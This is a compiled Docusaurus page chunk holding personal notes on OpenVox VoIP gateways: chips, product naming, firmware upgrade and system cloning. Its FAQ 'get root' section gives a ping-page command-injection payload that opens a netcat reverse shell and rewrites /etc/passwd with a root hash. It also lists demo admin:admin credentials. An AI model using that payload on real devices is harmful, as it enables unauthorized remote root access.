"use strict";(self.webpackChunkwener_website=self.webpackChunkwener_website||[]).push([["94771"],{54133:function(n,e,l){l.r(e),l.d(e,{metadata:()=>i,contentTitle:()=>d,default:()=>o,assets:()=>h,toc:()=>t,frontMatter:()=>c});var i=JSON.parse('{"id":"voip/openvox","title":"OpenVox","description":"- OpenVox","source":"@site/../notes/voip/openvox.md","sourceDirName":"voip","slug":"/voip/openvox","permalink":"/notes/voip/openvox","draft":false,"unlisted":false,"editUrl":"https://github.com/wenerme/wener/edit/master/notes/../notes/voip/openvox.md","tags":[],"version":"current","lastUpdatedBy":"wener","lastUpdatedAt":1646989992000,"frontMatter":{"id":"openvox","title":"OpenVox"},"sidebar":"docs","previous":{"title":"OpenVox Asterisk","permalink":"/notes/voip/openvox-asterisk"},"next":{"title":"Linphone","permalink":"/notes/voip/sip/linphone"}}'),s=l("52676"),r=l("79938");let c={id:"openvox",title:"OpenVox"},d="OpenVox",h={},t=[{value:"\u4EA7\u54C1\u547D\u540D",id:"\u4EA7\u54C1\u547D\u540D",level:2},{value:"\u4EA7\u54C1",id:"\u4EA7\u54C1",level:2},{value:"M83241G13",id:"m83241g13",level:2},{value:"A810",id:"a810",level:2},{value:"\u56FA\u4EF6",id:"\u56FA\u4EF6",level:2},{value:"\u83B7\u53D6 root \u6743\u9650",id:"\u83B7\u53D6-root-\u6743\u9650",level:2},{value:"toybox \u5DE5\u5177\u5305",id:"toybox-\u5DE5\u5177\u5305",level:2},{value:"clone system",id:"clone-system",level:2},{value:"fix local perm",id:"fix-local-perm",level:2}];function a(n){let e={a:"a",annotation:"annotation",code:"code",h1:"h1",h2:"h2",header:"header",li:"li",math:"math",mi:"mi",mn:"mn",mrow:"mrow",ol:"ol",p:"p",pre:"pre",semantics:"semantics",span:"span",ul:"ul",...(0,r.a)(),...n.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(e.header,{children:(0,s.jsx)(e.h1,{id:"openvox",children:"OpenVox"})}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"http://www.openvox.cn/cn/",children:"OpenVox"})}),"\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"https://openvox.cn/pub/",children:"https://openvox.cn/pub/"})}),"\n",(0,s.jsxs)(e.li,{children:["210 vs 230\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"230 has a longer wake width wise in the and not as steep; and the 210 has a steep shorter wake"}),"\n",(0,s.jsx)(e.li,{children:"The D230E/DE230E is an upgrade product of the D210E/DE210E."}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"https://openvoxwiki.atlassian.net/wiki/spaces/UM/pages/917549/D230E+DE230E+on+DAHDI+User+Manual",children:"D230E/DE230E on DAHDI User Manual"})}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.a,{href:"http://www.openvox.cn/pub/",children:"http://www.openvox.cn/pub/"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"\u516C\u5171\u6587\u6863"}),"\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"http://www.openvox.cn/pub/datasheets/English/D130_D230_D430_Series_PRI_Card_Datasheet.pdf",children:"D130/D230/D430 Series PRI Card_Datasheet"})}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.code,{children:"cat /proc/interrupts"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"\u67E5\u770B\u662F\u5426\u6709\u72EC\u7ACB\u4E2D\u65AD"}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(e.li,{children:"\u5355\u673A\u591A\u5361\u9700\u8981\u65F6\u949F\u7EBF"}),"\n",(0,s.jsx)(e.li,{children:"A \u5361\u90FD\u662F\u9644\u52A0 FXO-400, FSO-400"}),"\n",(0,s.jsxs)(e.li,{children:["D230E\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.a,{href:"https://www.infineon.com/",children:"infineon"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"PEF 22554 HT v2.1"}),"\n",(0,s.jsx)(e.li,{children:"QuadFALC"}),"\n",(0,s.jsx)(e.li,{children:"G0624"}),"\n",(0,s.jsx)(e.li,{children:"Framer and LIU (Line Interface Unit) Component (FALC)"}),"\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"https://www.infineon.com/cms/en/about-infineon/press/market-news/2002/129029.html",children:"Infineon Introduces 4-Line T1/E1/J1 Framer and LIU Component with Smallest Footprint and Lowest Power Consumption"})}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(e.li,{children:"4x MNOVR MS1442 1443Y"}),"\n",(0,s.jsxs)(e.li,{children:["AITRA cyclone IV\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"https://www.altera.com.cn/products/fpga/cyclone-series/cyclone-iv/overview.html",children:"Altera Cyclone\xae IV"})}),"\n",(0,s.jsx)(e.li,{children:"EP4CE10E17CBN"}),"\n",(0,s.jsx)(e.li,{children:"MALAYSIA"}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(e.li,{children:["\u9A71\u52A8\u4E0B\u8F7D - ",(0,s.jsx)(e.a,{href:"https://openvox.cn/pub/drivers/dahdi-linux-complete/",children:"https://openvox.cn/pub/drivers/dahdi-linux-complete/"})]}),"\n",(0,s.jsxs)(e.li,{children:["\u6F14\u793A\u7F51\u5173\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"http://demo.openvox.cn:65327/",children:"http://demo.openvox.cn:65327/"})}),"\n",(0,s.jsx)(e.li,{children:"admin:admin"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(e.h2,{id:"\u4EA7\u54C1\u547D\u540D",children:"\u4EA7\u54C1\u547D\u540D"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsxs)(e.li,{children:["VS - VoxStack\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"\u6A21\u5757\u5316\u7CFB\u5217\u7F51\u5173"}),"\n",(0,s.jsx)(e.li,{children:"\u652F\u6301\u70ED\u63D2\u62D4"}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(e.li,{children:"AG - Analog Gateway - \u6A21\u62DF\u7F51\u5173"}),"\n",(0,s.jsx)(e.li,{children:"DGW - \u6570\u5B57\u7F51\u5173"}),"\n",(0,s.jsx)(e.li,{children:"SWG - Standalone Wireless Gateway - \u72EC\u7ACB\u65E0\u7EBF\u7F51\u5173"}),"\n",(0,s.jsx)(e.li,{children:"GWM - Gateway Module - \u7F51\u5173\u6A21\u5757"}),"\n",(0,s.jsxs)(e.li,{children:["\u578B\u53F7\u683C\u5F0F\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"D - Digit, B - BRI, X - \u6DF7\u5408, G - GSM, A - Analog, V - \u7F16\u7801\u8F6C\u6362\u5361, TAP - \u5F55\u97F3\u5361, WCD - G \u5361\u7684 WCDMA \u6269\u5C55\u6A21\u5757"}),"\n",(0,s.jsx)(e.li,{children:"E - \u56DE\u58F0\u6D88\u9664"}),"\n",(0,s.jsx)(e.li,{children:"\u6570\u5B57 \u8DEF\u6570 1,2,4,8,24"}),"\n",(0,s.jsx)(e.li,{children:"\u7248\u672C 10/30, 30 \u662F 10 \u7684\u5347\u7EA7"}),"\n",(0,s.jsx)(e.li,{children:"P - PCI, E - PCIE"}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(e.li,{children:"GWM801O - 8 \u53E3 FXO \u6A21\u5757"}),"\n",(0,s.jsx)(e.li,{children:"GWM420L - 4 \u53E3 LTE \u6A21\u5757"}),"\n"]}),"\n",(0,s.jsx)(e.h2,{id:"\u4EA7\u54C1",children:"\u4EA7\u54C1"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsxs)(e.li,{children:["\u5E38\u89C1\u82AF\u7247\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"M83241G13 - CPU Comcerto 1000"}),"\n",(0,s.jsx)(e.li,{children:"Altera Cyclone IV EP4CE10F17C8N - FPGA"}),"\n",(0,s.jsx)(e.li,{children:"asmedia asm1083 - PCIe to PCI \u82AF\u7247"}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(e.li,{children:["E2M8HJ9DJ68P - VS \u6A21\u5757\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsxs)(e.li,{children:["M83241G13 - Freescale Semiconductor - NXP\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"Telecom Interface ICs C1K-LS102M 450MHz"}),"\n",(0,s.jsx)(e.li,{children:"IC C1K 450MHZ VOIP 448BGA"}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(e.li,{children:["FXS-420 v1.2 - FS42HJ1KK4UY5\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"S13215-FM"}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(e.li,{children:["FXO-400 v1.4 - FXODHJO2XT6L\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"3019-FT 1718FF L0L4"}),"\n",(0,s.jsx)(e.li,{children:"Si3050-FT 1708EM F1Q5"}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(e.li,{children:["A810E v1.4 - A814HJ1DBGCZ - PCIe \u5361\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"Altera Cyclone IV EP4CE10F17C8N - FPGA"}),"\n",(0,s.jsx)(e.li,{children:"asmedia asm1083 - PCIe to PCI \u82AF\u7247"}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(e.li,{children:"VS-AGU-E2M0800 - VoxStack \u7CFB\u5217 \u6A21\u62DF\u7F51\u5173"}),"\n",(0,s.jsxs)(e.li,{children:["VS-GGU-E2M0400 - VS \u7CFB\u5217, GSM \u7F51\u5173\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"\u786C\u4EF6\u7248\u672C Date 2012-11-09 FPGA 11 Hardware 00"}),"\n",(0,s.jsxs)(e.li,{children:["\u4E3B\u677F\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"RTL8316E"}),"\n",(0,s.jsx)(e.li,{children:"ATMLH424"}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(e.li,{children:["VS-GWM400\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"Quectel M35FAR01A08"}),"\n",(0,s.jsx)(e.li,{children:"Altera Cyclone IV EP4CE10F17C8N"}),"\n",(0,s.jsx)(e.li,{children:"asmedia asm1083"}),"\n",(0,s.jsx)(e.li,{children:"SPANSION S34ML01G200TF100 - Flash"}),"\n",(0,s.jsx)(e.li,{children:"CPU \u662F\u6A21\u5757\u5316\u63A5\u53E3"}),"\n",(0,s.jsx)(e.li,{children:"850/900/1800/1900MHz@GSM"}),"\n",(0,s.jsx)(e.li,{children:"900/2100MHz@UMTS"}),"\n",(0,s.jsx)(e.li,{children:"900/1800MHz@GSM"}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(e.li,{children:["VS_USB-1044\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"LTE FDD: B1/B3/B5/B8"}),"\n",(0,s.jsx)(e.li,{children:"LTE TDD: B38/B39/B40/B41"}),"\n",(0,s.jsx)(e.li,{children:"TD-SCDMA: B34/B39"}),"\n",(0,s.jsx)(e.li,{children:"CDMA: BC0"}),"\n",(0,s.jsx)(e.li,{children:"WCDMA: 900/2100MHz"}),"\n",(0,s.jsx)(e.li,{children:"GSM: 900/1800MHz"}),"\n",(0,s.jsx)(e.li,{children:"Avahi - WirelessGateway _burn._tcp - 169.254.8.223"}),"\n",(0,s.jsxs)(e.li,{children:["\u652F\u6301 SIM \u6A21\u5757\u7C7B\u578B\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"EC20 CE-HDLG"}),"\n",(0,s.jsx)(e.li,{children:"M26"}),"\n",(0,s.jsx)(e.li,{children:"M35 - LTE 4G"}),"\n",(0,s.jsx)(e.li,{children:"MCU"}),"\n",(0,s.jsx)(e.li,{children:"SIM6320C"}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(e.h2,{id:"m83241g13",children:"M83241G13"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"ARM1136 - 2 Core, 650MHz"}),"\n",(0,s.jsx)(e.li,{children:"\u654F\u8FC5\u79D1\u6280/Mindspeed Technologies \u82AF\u7247"}),"\n",(0,s.jsx)(e.li,{children:"Mindspeed \u4E3B\u8981\u63D0\u4F9B VoIP \u9886\u57DF\u89E3\u51B3\u65B9\u6848 - DSP, LTE, Transcede"}),"\n",(0,s.jsx)(e.li,{children:"VoIP, Security Engine, PCIe 2, RGMII 2"}),"\n",(0,s.jsx)(e.li,{children:"SDRAM 16/32 bit DDR2-800/667/533"}),"\n",(0,s.jsxs)(e.li,{children:["L1 \u7F13\u5B58 2x(64K D",(0,s.jsxs)(e.span,{className:"katex",children:[(0,s.jsx)(e.span,{className:"katex-mathml",children:(0,s.jsx)(e.math,{xmlns:"http://www.w3.org/1998/Math/MathML",children:(0,s.jsxs)(e.semantics,{children:[(0,s.jsxs)(e.mrow,{children:[(0,s.jsx)(e.mi,{mathvariant:"normal",children:"/"}),(0,s.jsx)(e.mn,{children:"64"}),(0,s.jsx)(e.mi,{children:"K"}),(0,s.jsx)(e.mi,{children:"I"})]}),(0,s.jsx)(e.annotation,{encoding:"application/x-tex",children:"/64K I"})]})})}),(0,s.jsx)(e.span,{className:"katex-html","aria-hidden":"true",children:(0,s.jsxs)(e.span,{className:"base",children:[(0,s.jsx)(e.span,{className:"strut",style:{height:"1em",verticalAlign:"-0.25em"}}),(0,s.jsx)(e.span,{className:"mord",children:"/64"}),(0,s.jsx)(e.span,{className:"mord mathnormal",style:{marginRight:"0.07153em"},children:"K"}),(0,s.jsx)(e.span,{className:"mord mathnormal",style:{marginRight:"0.07847em"},children:"I"})]})})]}),")"]}),"\n",(0,s.jsxs)(e.li,{children:["VoIP \u80FD\u529B\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"Field hardened voice features"}),"\n",(0,s.jsx)(e.li,{children:"World class acoustic echo cancellation technology"}),"\n",(0,s.jsx)(e.li,{children:"Narrow and wideband codecs"}),"\n",(0,s.jsx)(e.li,{children:"G.711, G.729, G.722, G.723.1, iLBC, T.38, G.729.1, G.722.2, AMR, AMR Wideband"}),"\n",(0,s.jsx)(e.li,{children:"Enhanced echo canceller, CID-I/II, VAD/CNG, AGC"}),"\n",(0,s.jsx)(e.li,{children:"3-Way conferencing"}),"\n"]}),"\n"]}),"\n",(0,s.jsx)(e.li,{children:"TDM/PCM interface for glue-less VoIP support"}),"\n",(0,s.jsx)(e.li,{children:"2009 \u5E74"}),"\n"]}),"\n",(0,s.jsx)(e.h2,{id:"a810",children:"A810"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"Communication controller: OpenVox Communication Co. Ltd. Device 0810 (rev 15)"}),"\n",(0,s.jsx)(e.li,{children:"OpenVOX \u7535\u8BDD\u6A21\u62DF\u8BED\u97F3\u5361 A810E Asterisk \u5361 8 \u8DEF\u8BED\u97F3\u5361 FXO/FXS \u6A21\u5757\u5316 A810E"}),"\n",(0,s.jsxs)(e.li,{children:["AE810E/AE810P ",(0,s.jsx)(e.a,{href:"https://openvox.cn/pub/misc/AE810E_AE810P_Elastix%202.0.4_User_Manual_English.pdf",children:"\u624B\u518C"})]}),"\n"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"modprobe \u2013r opvxa24xx\n"})}),"\n",(0,s.jsx)(e.h2,{id:"\u56FA\u4EF6",children:"\u56FA\u4EF6"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"https://www.openvox.cn/pub/firmwares",children:"https://www.openvox.cn/pub/firmwares"})}),"\n"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# \u5347\u7EA7\u6D41\u7A0B\nauto_update -i 1\nauto_update -b u-boot.bin\nauto_update -u -f AnalogGateway.img\n"})}),"\n",(0,s.jsx)(e.h1,{id:"faq",children:"FAQ"}),"\n",(0,s.jsx)(e.h2,{id:"\u83B7\u53D6-root-\u6743\u9650",children:"\u83B7\u53D6 root \u6743\u9650"}),"\n",(0,s.jsxs)(e.ol,{children:["\n",(0,s.jsx)(e.li,{children:"ssh \u7528\u6237\u540D\u4FEE\u6539\u4E3A super \u5373\u53EF"}),"\n",(0,s.jsx)(e.li,{children:"ping \u9875\u9762\u8FDB\u884C shell \u6CE8\u5165"}),"\n"]}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.code,{children:"google.com;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/ash -i 2>&1|nc yourip 1234 >/tmp/f"})}),"\n"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"cat /etc/passwd\necho 'root:$6$p5UxF/96kKYh3eVj$laEQueyeV4tDJV5ASR3kj7r5X/BtXQ/PJM4dCrnAo1M8HtSlDWupG7TQQ.r1wTncK.Jze4NNa9UN37wvT0L/L/:0:0:root:/tmp:/bin/bash' > /etc/passwd\n"})}),"\n",(0,s.jsx)(e.h2,{id:"toybox-\u5DE5\u5177\u5305",children:"toybox \u5DE5\u5177\u5305"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"wget https://landley.net/toybox/downloads/binaries/latest/toybox-$(uanem -m)\n"})}),"\n",(0,s.jsx)(e.h2,{id:"clone-system",children:"clone system"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"\u4E3B\u8981\u76EE\u5F55 /etc, /data, my_tools, /www"}),"\n",(0,s.jsx)(e.li,{children:"/www \u4E00\u822C\u4E3A link\uFF0C\u4E0D\u540C\u7248\u672C\u6307\u5411\u4E0D\u540C\u4F4D\u7F6E"}),"\n",(0,s.jsx)(e.li,{children:"/tmp \u4E0B\u4F1A\u5B58\u50A8\u4E00\u4E9B\u8FD0\u884C\u548C\u7CFB\u7EDF\u4FE1\u606F"}),"\n"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"ssh -p 12345 root@192.168.99.1 'cd /etc; tar cf - ./' | tar xvf - -C etc\n"})}),"\n",(0,s.jsx)(e.h2,{id:"fix-local-perm",children:"fix local perm"}),"\n",(0,s.jsx)(e.p,{children:"\u5220\u9664 link, \u4FEE\u590D \u76EE\u5F55 \u548C \u6587\u4EF6 \u6743\u9650"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"find . -type l -delete\nfind . -type d | xargs chmod 0744\nfind . -type f | xargs chmod 0644\n"})})]})}function o(n={}){let{wrapper:e}={...(0,r.a)(),...n.components};return e?(0,s.jsx)(e,{...n,children:(0,s.jsx)(a,{...n})}):a(n)}},79938:function(n,e,l){l.d(e,{Z:function(){return d},a:function(){return c}});var i=l(75271);let s={},r=i.createContext(s);function c(n){let e=i.useContext(r);return i.useMemo(function(){return"function"==typeof n?n(e):{...e,...n}},[e,n])}function d(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(s):n.components||s:c(n.components),i.createElement(r.Provider,{value:e},n.children)}}}]);